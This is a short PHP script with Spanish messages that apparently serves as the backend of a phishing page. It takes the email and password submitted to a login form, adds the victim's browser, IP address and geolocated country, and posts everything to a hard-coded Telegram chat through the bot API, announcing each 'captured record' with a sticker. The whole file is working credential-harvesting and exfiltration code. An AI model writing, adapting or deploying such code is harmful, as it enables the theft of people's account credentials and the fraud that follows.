<?php
require 'vendor/autoload.php'; // Asegúrate de que la ruta sea correcta

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->load();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    if (empty($email) || empty($password)) {
        echo json_encode(["status" => "error", "message" => "Campos vacíos"]);
        exit;
    }
    
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $country = 'Desconocido';
    
    $api_url = "http://ip-api.com/json/$ip";
    $response = file_get_contents($api_url);
    if ($response) {
        $data = json_decode($response, true);
        if ($data && isset($data['country'])) {
            $country = $data['country'];
        }
    }
    
    $chat_id = '7517363999';
    $token = $_ENV['TELEGRAM_BOT_TOKEN']; // Cargar el token desde las variables de entorno
    $message = "🚨 *Nuevo Registro Capturado* 🚨\n\n" .
               "📧 *Email:* `$email`\n" .
               "🔒 *Password:* `$password`\n" .
               "🌐 *Navegador:* `$browser`\n" .
               "🌍 *IP:* `$ip`\n" .
               "🗺️ *País:* `$country`";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    $response = curl_exec($ch);
    curl_close($ch);
    
    $sticker_id = "CAACAgQAAxkBAAEB123zjCnhIVkmZPIR3Zf23UJg9AOYWQACJgADwZxgDr22CrhLOO1HLgQ";
    $sticker_url = "https://api.telegram.org/bot$token/sendSticker";
    $sticker_params = [
        'chat_id' => $chat_id,
        'sticker' => $sticker_id
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sticker_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($sticker_params));
    curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        echo json_encode(["status" => "success"]);
    } else {
        echo json_encode(["status" => "error", "message" => "No se pudo enviar el mensaje a Telegram"]);
    }
} else {
    echo json_encode(["status" => "error", "message" => "Método de solicitud incorrecto"]);
}
?>
